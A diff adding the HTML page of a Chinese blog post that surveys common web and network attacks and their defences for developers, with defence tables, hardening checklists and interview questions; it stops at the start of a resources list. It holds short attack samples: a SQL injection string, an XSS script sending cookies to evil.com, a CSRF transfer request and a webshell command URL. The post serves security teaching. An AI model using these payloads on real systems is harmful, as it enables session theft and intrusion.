@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='48' fill='%230984e3'/%3E%3Ctext x='50' y='72' font-size='60' text-anchor='middle' fill='white'%3E鱼%3C/text%3E%3C/svg%3E">
+  <title>常见网络安全攻防技术 | 沉鱼的博客</title>
+  <link rel="stylesheet" href="/css/style.css?v=202605052015">
+  <script>
+  /* 必须在 body 渲染前确定主题，保证 giscus 等组件能拿到正确的初始值 */
+  (function() {
+    var saved = localStorage.getItem('theme');
+    var prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+    var isDark = saved === 'dark' || (!saved && prefersDark);
+    if (isDark) document.documentElement.setAttribute('data-theme', 'dark');
+    window.__theme = isDark ? 'dark' : 'light';
+  })();
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <button id="back-to-top" title="回到顶部">↑</button>
+  <button id="dark-toggle" title="切换主题">◐</button>
+
+  <header class="site-header">
+    <div class="container">
+      <h1 class="site-title"><a href="/">沉鱼的博客</a></h1>
+      <p class="site-subtitle">了解自我，超越自我</p>
+      <nav class="site-nav">
+        <a href="/">首页</a>
+        <a href="/archives">归档</a>
+        <a href="/categories">分类</a>
+        <a href="/tags">标签</a>
+        <a href="/ai-hotspots">AI行业热点</a>
+        <a href="/ai-daily">AI日报</a>
+        <!-- <a href="/downloads">资源</a> -->
+        <a href="/about">关于</a>
+        <div class="search-box">
+          <input type="text" id="search-input" placeholder="搜索..." autocomplete="off">
+          <div id="search-results"></div>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main class="site-main">
+    <div class="container">
+      <!-- 文章详情页 -->
+
+
+
+<article class="post-full">
+  <header class="post-header">
+    <h1 class="post-title">常见网络安全攻防技术</h1>
+    <div class="post-meta">
+      <span class="post-date">2026-05-08 22:10</span>
+      <span class="post-word-count">2747 字</span>
+      <span class="post-reading-time">约 10 分钟</span>
+    </div>
+    
+    <div class="post-categories">
+      分类：
+      
+      <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/">计算机科学</a>
+      
+      <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+      
+    </div>
+    
+    
+    <div class="post-tags">
+      标签：
+      
+      <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+      
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+      
+      <a href="/tags/XSS/">XSS</a>
+      
+      <a href="/tags/CSRF/">CSRF</a>
+      
+      <a href="/tags/DDoS/">DDoS</a>
+      
+      <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+      
+    </div>
+    
+  </header>
+
+  
+  <details class="toc-wrap" open>
+    <summary class="toc-title">目录</summary>
+    <nav class="toc">
+      
+      <a class="toc-level-2" href="#一攻防全景图">一、攻防全景图</a>
+      
+      <a class="toc-level-2" href="#二web-应用攻击">二、Web 应用攻击</a>
+      
+      <a class="toc-level-3" href="#21-sql-注入-sql-injection">2.1 SQL 注入 (SQL Injection)</a>
+      
+      <a class="toc-level-3" href="#22-xss-跨站脚本攻击-cross-site-scripting">2.2 XSS 跨站脚本攻击 (Cross-Site Scripting)</a>
+      
+      <a class="toc-level-3" href="#23-csrf-跨站请求伪造-cross-site-request-forgery">2.3 CSRF 跨站请求伪造 (Cross-Site Request Forgery)</a>
+      
+      <a class="toc-level-3" href="#24-ssrf-服务端请求伪造-server-side-request-forgery">2.4 SSRF 服务端请求伪造 (Server-Side Request Forgery)</a>
+      
+      <a class="toc-level-3" href="#25-文件上传漏洞">2.5 文件上传漏洞</a>
+      
+      <a class="toc-level-2" href="#三网络层攻击">三、网络层攻击</a>
+      
+      <a class="toc-level-3" href="#31-ddos-分布式拒绝服务-distributed-denial-of-service">3.1 DDoS 分布式拒绝服务 (Distributed Denial of Service)</a>
+      
+      <a class="toc-level-3" href="#32-中间人攻击-mitm-man-in-the-middle">3.2 中间人攻击 MITM (Man-in-the-Middle)</a>
+      
+      <a class="toc-level-3" href="#33-dns-劫持">3.3 DNS 劫持</a>
+      
+      <a class="toc-level-2" href="#四安全加固最佳实践清单">四、安全加固最佳实践清单</a>
+      
+      <a class="toc-level-3" href="#41-开发阶段">4.1 开发阶段</a>
+      
+      <a class="toc-level-3" href="#42-运维阶段">4.2 运维阶段</a>
+      
+      <a class="toc-level-3" href="#43-安全工具栈">4.3 安全工具栈</a>
+      
+      <a class="toc-level-2" href="#五攻防演练流程">五、攻防演练流程</a>
+      
+      <a class="toc-level-2" href="#六常见面试题">六、常见面试题</a>
+      
+      <a class="toc-level-2" href="#七推荐资源">七、推荐资源</a>
+      
+    </nav>
+  </details>
+  
+
+  <div class="post-content">
+    <blockquote>
+<p>网络安全的本质是攻防对抗。本文梳理了最常见的攻击手法与对应的防御策略，帮助开发者建立基本的安全意识。</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="一攻防全景图"><a href="#一、攻防全景图" class="headerlink" title="一、攻防全景图"></a>一、攻防全景图</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[网络安全攻防] --&gt; B[Web 应用攻击]</span><br><span class="line">    A --&gt; C[网络层攻击]</span><br><span class="line">    A --&gt; D[系统层攻击]</span><br><span class="line">    A --&gt; E[社会工程]</span><br><span class="line"></span><br><span class="line">    B --&gt; B1[SQL 注入]</span><br><span class="line">    B --&gt; B2[XSS 跨站脚本]</span><br><span class="line">    B --&gt; B3[CSRF 跨站请求伪造]</span><br><span class="line">    B --&gt; B4[SSRF 服务端请求伪造]</span><br><span class="line">    B --&gt; B5[文件上传漏洞]</span><br><span class="line"></span><br><span class="line">    C --&gt; C1[DDoS 分布式拒绝服务]</span><br><span class="line">    C --&gt; C2[中间人攻击 MITM]</span><br><span class="line">    C --&gt; C3[DNS 劫持]</span><br><span class="line">    C --&gt; C4[端口扫描]</span><br><span class="line"></span><br><span class="line">    D --&gt; D1[缓冲区溢出]</span><br><span class="line">    D --&gt; D2[提权攻击]</span><br><span class="line">    D --&gt; D3[后门/Rootkit]</span><br><span class="line"></span><br><span class="line">    E --&gt; E1[钓鱼攻击]</span><br><span class="line">    E --&gt; E2[暴力破解]</span><br><span class="line">    E --&gt; E3[撞库攻击]</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二web-应用攻击"><a href="#二、Web-应用攻击" class="headerlink" title="二、Web 应用攻击"></a>二、Web 应用攻击</h2><h3 id="21-sql-注入-sql-injection"><a href="#2-1-SQL-注入-SQL-Injection" class="headerlink" title="2.1 SQL 注入 (SQL Injection)"></a>2.1 SQL 注入 (SQL Injection)</h3><p><strong>原理：</strong> 攻击者将恶意 SQL 语句拼接到应用输入中，欺骗数据库执行非授权操作。</p>
+<p><strong>攻击示例：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 正常查询</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注入攻击（输入: 1&#x27; OR &#x27;1&#x27;=&#x27;1）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="comment">-- 返回全部用户数据，完全绕过认证！</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant A as 攻击者</span><br><span class="line">    participant W as Web 应用</span><br><span class="line">    participant DB as 数据库</span><br><span class="line">    </span><br><span class="line">    A-&gt;&gt;W: 提交恶意输入 &#x27; OR 1=1 --</span><br><span class="line">    W-&gt;&gt;DB: 拼接 SQL: SELECT * FROM users WHERE name=&#x27;&#x27; OR 1=1 --&#x27;</span><br><span class="line">    DB--&gt;&gt;W: 返回所有用户数据</span><br><span class="line">    W--&gt;&gt;A: 数据泄露！</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御手段：</strong></p>
+<table>
+<thead>
+<tr>
+<th>措施</th>
+<th>说明</th>
+<th>优先级</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>参数化查询 &#x2F; 预编译语句</td>
+<td>使用 <code>?</code> 占位符，SQL 与数据分离</td>
+<td>✅ 必做</td>
+</tr>
+<tr>
+<td>ORM 框架</td>
+<td>MyBatis、Hibernate、JPA 等天然防注入</td>
+<td>✅ 推荐</td>
+</tr>
+<tr>
+<td>输入校验</td>
+<td>白名单校验，拒绝特殊字符</td>
+<td>⚠️ 辅助</td>
+</tr>
+<tr>
+<td>最小权限原则</td>
+<td>数据库账号不给予 DROP&#x2F;TRUNCATE 权限</td>
+<td>✅ 必做</td>
+</tr>
+<tr>
+<td>WAF (Web 应用防火墙)</td>
+<td>拦截已知注入特征</td>
+<td>⚠️ 辅助</td>
+</tr>
+</tbody></table>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ❌ 危险：字符串拼接</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE name = &#x27;&quot;</span> + userName + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 安全：参数化查询（JDBC PreparedStatement）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE name = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">ps.setString(<span class="number">1</span>, userName);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="22-xss-跨站脚本攻击-cross-site-scripting"><a href="#2-2-XSS-跨站脚本攻击-Cross-Site-Scripting" class="headerlink" title="2.2 XSS 跨站脚本攻击 (Cross-Site Scripting)"></a>2.2 XSS 跨站脚本攻击 (Cross-Site Scripting)</h3><p><strong>原理：</strong> 攻击者在网页中注入恶意脚本，当其他用户浏览时脚本被执行，窃取 Cookie、Token 等敏感信息。</p>
+<p><strong>三种类型：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    XSS[XSS] --&gt; Reflected[反射型 XSS]</span><br><span class="line"></span><br><span class="line">    XSS --&gt; Stored[存储型 XSS&lt;br/&gt;最危险]</span><br><span class="line">    XSS --&gt; DOM[DOM-based XSS]</span><br><span class="line"></span><br><span class="line">    Reflected --&gt;|一次性| RefEx[&quot;?q=&lt;script&gt;alert(1)&lt;/script&gt;&quot;]</span><br><span class="line">    Stored --&gt;|持久化| StoEx[&quot;评论/留言框&lt;br/&gt;嵌入恶意脚本&quot;]</span><br><span class="line">    DOM --&gt;|前端渲染| DOMEx[&quot;URL 片段注入&lt;br/&gt;前端 eval 执行&quot;]</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击示例：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 评论框中输入恶意脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://evil.com/steal?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>防御手段：</strong></p>
+<table>
+<thead>
+<tr>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输出编码 &#x2F; 转义</td>
+<td>HTML 实体编码：<code>&lt;</code> → <code>&amp;lt;</code>，<code>&gt;</code> → <code>&amp;gt;</code></td>
+</tr>
+<tr>
+<td>Content-Security-Policy</td>
+<td>CSP HTTP 头限制脚本执行来源</td>
+</tr>
+<tr>
+<td>HttpOnly Cookie</td>
+<td>JavaScript 无法读取 Cookie</td>
+</tr>
+<tr>
+<td>输入过滤</td>
+<td>过滤 <code>&lt;script&gt;</code>、<code>onerror=</code> 等危险标签</td>
+</tr>
+</tbody></table>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># CSP 响应头示例：只允许同源脚本</span><br><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://trusted.cdn.com</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="23-csrf-跨站请求伪造-cross-site-request-forgery"><a href="#2-3-CSRF-跨站请求伪造-Cross-Site-Request-Forgery" class="headerlink" title="2.3 CSRF 跨站请求伪造 (Cross-Site Request Forgery)"></a>2.3 CSRF 跨站请求伪造 (Cross-Site Request Forgery)</h3><p><strong>原理：</strong> 攻击者伪造请求，诱导已登录用户点击，在用户不知情的情况下以用户身份执行操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant U as 用户(已登录银行)</span><br><span class="line">    participant A as 攻击者网站</span><br><span class="line">    participant B as 银行网站</span><br><span class="line">    </span><br><span class="line">    U-&gt;&gt;B: 登录，获得 Cookie</span><br><span class="line">    U-&gt;&gt;A: 访问恶意网站</span><br><span class="line">    A-&gt;&gt;B: &lt;img src=&#x27;/transfer?to=attacker&amp;amount=10000&#x27;&gt;</span><br><span class="line">    Note over U,B: 浏览器自动携带 Cookie！</span><br><span class="line">    B--&gt;&gt;A: 转账成功（用户不知情）</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御手段：</strong></p>
+<table>
+<thead>
+<tr>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CSRF Token</td>
+<td>表单中嵌入随机 token，服务端校验</td>
+</tr>
+<tr>
+<td>SameSite Cookie</td>
+<td>设置 <code>SameSite=Strict</code>，跨站不发送 Cookie</td>
+</tr>
+<tr>
+<td>验证码</td>
+<td>敏感操作要求输入验证码</td>
+</tr>
+<tr>
+<td>Referer 校验</td>
+<td>检查请求来源是否合法</td>
+</tr>
+</tbody></table>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生成 CSRF Token</span></span><br><span class="line"><span class="type">String</span> <span class="variable">csrfToken</span> <span class="operator">=</span> UUID.randomUUID().toString();</span><br><span class="line">session.setAttribute(<span class="string">&quot;csrf_token&quot;</span>, csrfToken);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 校验</span></span><br><span class="line"><span class="type">String</span> <span class="variable">requestToken</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;csrf_token&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!requestToken.equals(session.getAttribute(<span class="string">&quot;csrf_token&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;CSRF 攻击检测！&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=xxx; SameSite=Strict; HttpOnly; Secure</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="24-ssrf-服务端请求伪造-server-side-request-forgery"><a href="#2-4-SSRF-服务端请求伪造-Server-Side-Request-Forgery" class="headerlink" title="2.4 SSRF 服务端请求伪造 (Server-Side Request Forgery)"></a>2.4 SSRF 服务端请求伪造 (Server-Side Request Forgery)</h3><p><strong>原理：</strong> 攻击者利用服务器端发起的请求功能，访问内网资源或进行端口扫描。</p>
+<p><strong>常见场景：</strong> 图片抓取、URL 预览、Webhook 回调等。</p>
+<p><strong>防御手段：</strong></p>
+<ul>
+<li>限制服务器发起的请求只能访问外部白名单域名</li>
+<li>禁止访问内网 IP 段（127.0.0.1、10.x.x.x、172.16-31.x.x、192.168.x.x）</li>
+<li>禁用 <code>file://</code>、<code>gopher://</code> 等非 HTTP 协议</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 危险：直接请求用户传入的 URL</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">return</span> requests.get(url)  <span class="comment"># 攻击者传入 http://127.0.0.1:3306</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安全：白名单校验</span></span><br><span class="line">ALLOWED_DOMAINS = [<span class="string">&#x27;api.trusted.com&#x27;</span>, <span class="string">&#x27;img.cdn.com&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_url</span>(<span class="params">url</span>):</span><br><span class="line">    parsed = urlparse(url)</span><br><span class="line">    <span class="keyword">if</span> parsed.hostname <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_DOMAINS:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法请求来源&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> parsed.scheme <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>]:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;不支持的协议&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> requests.get(url, timeout=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="25-文件上传漏洞"><a href="#2-5-文件上传漏洞" class="headerlink" title="2.5 文件上传漏洞"></a>2.5 文件上传漏洞</h3><p><strong>原理：</strong> 应用允许用户上传文件但校验不严，攻击者上传 WebShell、恶意脚本等。</p>
+<p><strong>攻击示例：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 上传 jsp/php webshell 到服务器</span></span><br><span class="line"><span class="comment"># 访问 http://target.com/uploads/shell.jsp?cmd=whoami</span></span><br><span class="line"><span class="comment"># 服务器执行命令，完全沦陷</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>防御手段：</strong></p>
+<table>
+<thead>
+<tr>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>后缀白名单</td>
+<td>只允许 <code>.jpg .png .pdf</code> 等，拒绝 <code>.jsp .php .exe</code></td>
+</tr>
+<tr>
+<td>MIME 类型校验</td>
+<td>检查 <code>Content-Type</code> 头</td>
+</tr>
+<tr>
+<td>文件内容校验</td>
+<td>读取文件头魔术数字</td>
+</tr>
+<tr>
+<td>上传目录不可执行</td>
+<td>移除执行权限</td>
+</tr>
+<tr>
+<td>随机重命名</td>
+<td>防止文件名猜测和路径遍历</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="三网络层攻击"><a href="#三、网络层攻击" class="headerlink" title="三、网络层攻击"></a>三、网络层攻击</h2><h3 id="31-ddos-分布式拒绝服务-distributed-denial-of-service"><a href="#3-1-DDoS-分布式拒绝服务-Distributed-Denial-of-Service" class="headerlink" title="3.1 DDoS 分布式拒绝服务 (Distributed Denial of Service)"></a>3.1 DDoS 分布式拒绝服务 (Distributed Denial of Service)</h3><p><strong>原理：</strong> 利用大量僵尸主机同时向目标发送请求，耗尽带宽、CPU 或连接数，导致正常用户无法访问。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[攻击者 C&amp;C] --&gt; B1[僵尸主机 1]</span><br><span class="line">    A --&gt; B2[僵尸主机 2]</span><br><span class="line">    A --&gt; B3[僵尸主机 ...N]</span><br><span class="line">    B1 --&gt; C[目标服务器]</span><br><span class="line">    B2 --&gt; C</span><br><span class="line">    B3 --&gt; C</span><br><span class="line">    C --&gt; D[资源耗尽&lt;br/&gt;服务瘫痪]</span><br></pre></td></tr></table></figure>
+
+<p><strong>常见 DDoS 类型：</strong></p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>攻击层</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SYN Flood</td>
+<td>L4 传输层</td>
+<td>发送大量 SYN 包不完成三次握手</td>
+</tr>
+<tr>
+<td>UDP Flood</td>
+<td>L4 传输层</td>
+<td>大量 UDP 包淹没目标带宽</td>
+</tr>
+<tr>
+<td>HTTP Flood</td>
+<td>L7 应用层</td>
+<td>模拟正常 HTTP 请求攻击应用</td>
+</tr>
+<tr>
+<td>DNS Amplification</td>
+<td>L4→反射</td>
+<td>利用 DNS 开放解析器放大流量</td>
+</tr>
+</tbody></table>
+<p><strong>防御手段：</strong></p>
+<ul>
+<li><strong>CDN &#x2F; 云清洗</strong>：Cloudflare、阿里云 WAF、AWS Shield</li>
+<li><strong>速率限制</strong>：Nginx <code>limit_req</code>、<code>limit_conn</code></li>
+<li><strong>SYN Cookie</strong>：防止半连接队列耗尽</li>
+<li><strong>IP 黑&#x2F;白名单</strong>：封禁异常 IP</li>
+<li><strong>Anycast 网络</strong>：分散流量到多个数据中心</li>
+</ul>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nginx 速率限制示例</span></span><br><span class="line"><span class="attribute">limit_req_zone</span> <span class="variable">$binary_remote_addr</span> zone=one:<span class="number">10m</span> rate=30r/s;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> /api/ &#123;</span><br><span class="line">        <span class="attribute">limit_req</span> zone=one burst=<span class="number">20</span> nodelay;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="32-中间人攻击-mitm-man-in-the-middle"><a href="#3-2-中间人攻击-MITM-Man-in-the-Middle" class="headerlink" title="3.2 中间人攻击 MITM (Man-in-the-Middle)"></a>3.2 中间人攻击 MITM (Man-in-the-Middle)</h3><p><strong>原理：</strong> 攻击者拦截并篡改通信双方的数据，常见于公共 Wi-Fi、ARP 欺骗等场景。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant U as 用户</span><br><span class="line">    participant M as 攻击者(中间人)</span><br><span class="line">    participant S as 服务器</span><br><span class="line">    </span><br><span class="line">    U-&gt;&gt;M: 我是用户，我要访问服务器</span><br><span class="line">    M-&gt;&gt;S: 我是用户（假冒）</span><br><span class="line">    S-&gt;&gt;M: 响应数据</span><br><span class="line">    M-&gt;&gt;U: 篡改后的数据</span><br><span class="line">    Note over M: 攻击者可读取/修改&lt;br/&gt;全部通信内容！</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御手段：</strong></p>
+<ul>
+<li><strong>HTTPS</strong>：全站启用 TLS，证书验证</li>
+<li><strong>HSTS</strong>：强制浏览器使用 HTTPS</li>
+<li><strong>证书固定</strong>：Pin 证书公钥，防止伪造证书</li>
+<li><strong>避免公共 Wi-Fi</strong>：使用 VPN 加密隧道</li>
+</ul>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nginx HSTS 配置</span></span><br><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=63072000; includeSubDomains; preload&quot;</span> always;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="33-dns-劫持"><a href="#3-3-DNS-劫持" class="headerlink" title="3.3 DNS 劫持"></a>3.3 DNS 劫持</h3><p><strong>原理：</strong> 篡改 DNS 解析结果，将用户引导到钓鱼网站。</p>
+<p><strong>防御手段：</strong></p>
+<ul>
+<li><strong>DNSSEC</strong>：DNS 签名验证</li>
+<li><strong>DoH &#x2F; DoT</strong>：DNS over HTTPS&#x2F;TLS，加密 DNS 查询</li>
+<li><strong>使用可信 DNS</strong>：<code>1.1.1.1</code> (Cloudflare)、<code>8.8.8.8</code> (Google)</li>
+</ul>
+<hr>
+<h2 id="四安全加固最佳实践清单"><a href="#四、安全加固最佳实践清单" class="headerlink" title="四、安全加固最佳实践清单"></a>四、安全加固最佳实践清单</h2><h3 id="41-开发阶段"><a href="#4-1-开发阶段" class="headerlink" title="4.1 开发阶段"></a>4.1 开发阶段</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[✅] 所有 SQL 使用参数化查询</span><br><span class="line">[✅] 输出内容进行 HTML 编码</span><br><span class="line">[✅] 敏感操作加 CSRF Token</span><br><span class="line">[✅] 密码使用 bcrypt / argon2 哈希存储</span><br><span class="line">[✅] 用户上传文件做白名单校验</span><br><span class="line">[✅] 禁用 DEBUG 模式（不要泄漏堆栈信息）</span><br><span class="line">[✅] 使用 HTTPS，设置 HSTS</span><br><span class="line">[✅] 设置 HttpOnly + Secure + SameSite Cookie</span><br><span class="line">[✅] 添加 CSP 响应头</span><br><span class="line">[✅] API 接口做限流防刷</span><br></pre></td></tr></table></figure>
+
+<h3 id="42-运维阶段"><a href="#4-2-运维阶段" class="headerlink" title="4.2 运维阶段"></a>4.2 运维阶段</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[✅] 服务器端口最小化开放（只开 80/443/SSH）</span><br><span class="line">[✅] SSH 禁用密码登录，使用密钥</span><br><span class="line">[✅] 定期更新系统 + 软件包（CVE 修复）</span><br><span class="line">[✅] 数据库不对外开放，只监听内网</span><br><span class="line">[✅] 日志集中管理 + 异常告警</span><br><span class="line">[✅] 定期备份数据</span><br><span class="line">[✅] 网络隔离：生产/测试/开发环境分离</span><br><span class="line">[✅] 配置 WAF + 入侵检测系统 IDS/IPS</span><br><span class="line">[✅] 最小权限原则：每个服务只给必要权限</span><br><span class="line">[✅] 运行 Docker 容器时不使用 root</span><br></pre></td></tr></table></figure>
+
+<h3 id="43-安全工具栈"><a href="#4-3-安全工具栈" class="headerlink" title="4.3 安全工具栈"></a>4.3 安全工具栈</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>OWASP ZAP &#x2F; Burp Suite</td>
+<td>Web 漏洞扫描与渗透测试</td>
+</tr>
+<tr>
+<td>Nmap</td>
+<td>端口扫描与网络发现</td>
+</tr>
+<tr>
+<td>Wireshark</td>
+<td>流量抓包分析</td>
+</tr>
+<tr>
+<td>Metasploit</td>
+<td>渗透测试框架</td>
+</tr>
+<tr>
+<td>ClamAV</td>
+<td>防病毒扫描</td>
+</tr>
+<tr>
+<td>Fail2ban</td>
+<td>暴力破解防护</td>
+</tr>
+<tr>
+<td>OpenVAS</td>
+<td>漏洞扫描器</td>
+</tr>
+<tr>
+<td>Trivy &#x2F; Snyk</td>
+<td>容器镜像安全扫描</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五攻防演练流程"><a href="#五、攻防演练流程" class="headerlink" title="五、攻防演练流程"></a>五、攻防演练流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A[信息收集] --&gt; B[漏洞扫描]</span><br><span class="line">    B --&gt; C[漏洞利用]</span><br><span class="line">    C --&gt; D[权限提升]</span><br><span class="line">    D --&gt; E[横向移动]</span><br><span class="line">    E --&gt; F[数据窃取/后门植入]</span><br><span class="line">    </span><br><span class="line">    G[Honeypot 蜜罐] -.-&gt; A</span><br><span class="line">    H[WAF/IDS] -.-&gt; B</span><br><span class="line">    I[最小权限 RABC] -.-&gt; D</span><br><span class="line">    J[网络微隔离] -.-&gt; E</span><br><span class="line">    K[DLP 数据防泄漏] -.-&gt; F</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>蓝方（防守方）的每层防御，都对应红方（攻击方）的每一步。</p>
+</blockquote>
+<hr>
+<h2 id="六常见面试题"><a href="#六、常见面试题" class="headerlink" title="六、常见面试题"></a>六、常见面试题</h2><p><strong>Q1：SQL 注入怎么防御？</strong><br>A：核心是参数化查询，辅助是输入校验 + 最小权限 + WAF。</p>
+<p><strong>Q2：XSS 和 CSRF 的区别？</strong><br>A：XSS 是信任用户输入导致的脚本注入，CSRF 是信任用户浏览器导致的请求伪造。XSS 可以窃取 CSRF Token，所以先防 XSS 再防 CSRF。</p>
+<p><strong>Q3：HTTPS 能防哪些攻击？</strong><br>A：防中间人窃听&#x2F;篡改、防 DNS 劫持（结合 HSTS）。防不了 DDoS、业务逻辑漏洞、XSS。</p>
+<p><strong>Q4：什么是纵深防御？</strong><br>A：多层防御体系——即使某一层被攻破，后续层仍然能拦截。如 WAF → API 校验 → 数据库权限 → 加密存储。</p>
+<p><strong>Q5：如果服务器已经被入侵怎么办？</strong><br>A：①立即断网隔离 → ②保留现场证据 → ③排查入侵路径 → ④重装系统恢复 → ⑤修补漏洞 → ⑥复盘改进。</p>
+<hr>
+<h2 id="七推荐资源"><a href="#七、推荐资源" class="headerlink" title="七、推荐资源"></a>七、推荐资源</h2><ul>
